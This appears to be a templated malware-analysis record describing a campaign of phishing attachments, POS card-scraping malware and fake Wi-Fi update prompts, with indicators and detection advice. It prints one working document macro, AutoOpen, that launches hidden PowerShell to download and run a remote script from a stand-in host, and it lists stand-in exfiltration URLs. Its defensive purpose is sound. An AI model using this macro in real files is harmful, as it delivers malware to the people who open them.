package_info.why_malicious: The analyzed threat campaign leverages multiple attack vectors—including malicious email attachments, POS system malware, and fake software update prompts on compromised hotel Wi-Fi—to deliver and execute code that exfiltrates sensitive data, establishes persistence, and enables further compromise. The campaign is malicious because it abuses trusted user workflows (email, POS, Wi-Fi) to deploy code that steals credentials, credit card data, and other sensitive information, violating user and system security expectations.

execution_context.trigger: User opens a malicious email attachment (e.g., a fake invoice document) containing embedded macros.
execution_context.file_location: Email attachment file (e.g., .doc, .docm) with embedded PowerShell macro

malicious_snippets.code_snippet:
PowerShell script embedded in a fake invoice attachment, typically invoked via a macro such as:

Sub AutoOpen()
  Dim cmd As String
  cmd = "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/trojan.ps1')"
  Shell cmd, vbHide
End Sub
malicious_snippets.code_behavior: When the user opens the malicious attachment, the embedded macro triggers PowerShell execution, which downloads a trojan from a remote server, writes it to disk, and establishes persistence by modifying system startup entries.

malice_analysis.why_suspicious: Execution of PowerShell via document macros is a well-known malware delivery technique, especially when it downloads and executes remote code without user consent.
malice_analysis.violated_expectations: Legitimate invoice attachments should not execute scripts, launch PowerShell, or download and install software upon opening.
malice_analysis.similar_legitimate_use: IT administrators may use PowerShell scripts for automation, but not through unsolicited email attachments or document macros.
key_indicators: PowerShell process spawned by Office application
Document macros invoking external network connections
Download and execution of remote payloads
Persistence mechanisms such as registry Run keys or scheduled tasks

execution_context.trigger: Malware executes at runtime on a compromised POS system after initial infection.
execution_context.file_location: POS system memory and installed malware binary (e.g., C:\Windows\System32\malware.exe)

malicious_snippets.code_language: C/C++ (compiled binary, may include assembly routines)
malicious_snippets.code_behavior: At runtime on the POS system, the malware scans process memory for credit card data, collects any discovered track information, and sends it to an attacker-controlled server via HTTP POST requests.

malice_analysis.why_suspicious: POS systems should not have processes that continuously scan memory for credit card data and transmit it externally; such behavior is indicative of data scraping malware.
malice_analysis.violated_expectations: Legitimate POS software processes transactions securely and never exfiltrates raw card data or scans unrelated process memory.
malice_analysis.similar_legitimate_use: Memory scanning tools may be used for debugging or diagnostics, but not in production POS environments or for extracting sensitive payment data.
key_indicators: Unusual memory access patterns targeting POS processes
Presence of unknown or unsigned binaries in system directories
Outbound HTTP/S connections to untrusted or attacker-controlled domains
Regular exfiltration of data matching credit card track formats

execution_context.trigger: User connects to a compromised hotel Wi-Fi and is presented with a fake software update prompt, leading to download and execution of a malicious installer.
execution_context.file_location: Downloaded executable or installer file (e.g., C:\Users\<user>\Downloads\update.exe or /Users/<user>/Downloads/update.pkg)

malicious_snippets.code_language: varies (Windows executable, macOS app, or Linux binary)
malicious_snippets.code_behavior: After the user connects to the compromised Wi-Fi and accepts the fake software update prompt, the downloaded malware executes, collects sensitive user data (such as credentials and files), and exfiltrates it to the attacker's server.

malice_analysis.why_suspicious: Software update prompts delivered via captive portals on public Wi-Fi are a common method for distributing malware, especially when they immediately prompt for installation of unsigned executables.
malice_analysis.violated_expectations: Legitimate software updates are initiated by the user or trusted vendors, not by captive portals or unsolicited prompts after connecting to Wi-Fi.
malice_analysis.similar_legitimate_use: Captive portals may prompt for authentication or terms acceptance, but should never prompt for software installation.
key_indicators: Software installation prompts immediately after Wi-Fi connection
Downloaded executables from captive portal domains
Outbound connections to attacker infrastructure following installation
Collection and exfiltration of sensitive user data

attack_chain.action: User receives a phishing email containing a malicious attachment with embedded macros.
attack_chain.leads_to: Execution of PowerShell script, download and installation of trojan malware.

attack_chain.action: Trojan establishes persistence on the system and enables further compromise.
attack_chain.leads_to: Potential for lateral movement, credential theft, or data exfiltration.

attack_chain.action: POS system is infected with data scraping malware that scans memory for credit card data.
attack_chain.leads_to: Exfiltration of credit card data to attacker-controlled infrastructure.

attack_chain.action: Attacker compromises hotel Wi-Fi and delivers malware via a fake software update prompt.
attack_chain.leads_to: Sensitive user information is collected and exfiltrated to the attacker.

behavioral_signatures: Execution of PowerShell scripts or commands from document macros or attachments
Office applications spawning PowerShell or command-line processes
Unusual memory access and data exfiltration from POS system processes
Software installation prompts or downloads triggered immediately after connecting to public Wi-Fi
Outbound network connections to untrusted or attacker-controlled domains following user interaction
file_indicators: Documents (e.g., .doc, .docm) with embedded macros invoking PowerShell
Unknown or unsigned binaries present in POS system directories (e.g., C:\Windows\System32\malware.exe)
Executables or installers downloaded from captive portal or non-vendor domains
network_indicators: Connections to known C2 infrastructure or suspicious domains after opening attachments (e.g., http://malicious-domain.com/trojan.ps1)
Outbound HTTP/S traffic from POS systems to unfamiliar IPs or domains (e.g., http://attacker-c2.com/upload)
Data uploads from guest devices to attacker infrastructure shortly after Wi-Fi connection (e.g., http://malicious-wifi.com/collect)
detection_knowledge.how_to_detect: Monitor for Office applications spawning PowerShell or command-line processes, scan for documents with embedded macros invoking external scripts, audit POS systems for unauthorized memory access and unknown binaries, alert on software installation prompts or downloads from captive portals, and analyze outbound network traffic for connections to suspicious or attacker-controlled domains and exfiltration of sensitive data.
